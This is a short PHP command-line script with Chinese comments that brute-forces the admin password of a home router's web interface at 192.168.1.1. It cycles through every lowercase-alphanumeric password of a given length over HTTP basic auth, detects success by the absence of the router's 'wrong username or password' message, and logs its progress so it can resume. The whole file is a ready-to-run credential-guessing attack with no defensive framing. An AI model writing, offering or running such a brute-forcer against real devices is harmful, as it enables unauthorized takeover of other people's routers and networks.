<?php

// 用 $pwd 尝试
function try_router_web($url, $pwd)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERPWD, 'admin:' . $pwd);

    do {
        $http_code = 200;
        $content = curl_exec($ch);
        if ($content === false){
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        }
    } while ($http_code == 0);
    curl_close($ch);
    
    $content = iconv('GBK', 'UTF-8//IGNORE', $content);
    if (strpos($content, '用户名或密码有误') === false){
        return true;
    }
    
    return false;
}

// array plus
function plus(&$arr, $size)
{
    $n = count($arr);
    $arr[$n - 1]++;
    
    for ($i=1; $i<=$n; $i++){
        if ($arr[$n - $i] >= $size){
            $arr[$n - $i] = 0;
            if (isset($arr[$n - $i - 1])){
                $arr[$n - $i - 1]++;
            }
        }
    }
    
    if ($arr == array_fill(0, $n, 0)){
        return false;
    }
}

// try 主函数
function try_main($count)
{
    $log_file = 'log.txt'; // 记录日志，断点续算
    $url = 'http://192.168.1.1/'; // http://192.168.1.1/userRpm/ChangeLoginPwdRpm.htm
    $str = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $size = strlen($str);
    
    if (file_exists($log_file)){
        $arr = unserialize(file_get_contents($log_file));
    } else {
        $arr = array_fill(0, $count, 0);
    }
    if (count($arr) != $count){
        echo 'your last try ' . count($arr) . ' bit password, this time you try '
            . $count . 'bits password, do you really want to do this?';
        exit();
    }
    $idx = 0;
    
    do {
        // 试用密码
        $pwd = '';
        for ($i=0; $i<$count; $i++){
            $pwd .= $str[$arr[$i]];
        }
        
        if (try_router_web($url, $pwd)){
            echo $idx . ' succees: pwd = ' . $pwd . " !\n";
            exit();
        } else {
            echo $idx . ' fail: try pwd = ' . $pwd . "\n";
        }
        
        $rt = plus($arr, $size);
        
        if (++$idx == 100){
            file_put_contents($log_file, serialize($arr));
            $idx = 0;
        }
    } while ($rt !== false);
}

// main start
if (isset($argv[1])){
    try_main((int)$argv[1]);
} else {
    echo <<<EOF
error... you should do it like this:
    php try_router_web.php 6 [6 is the length of the password]
EOF;
}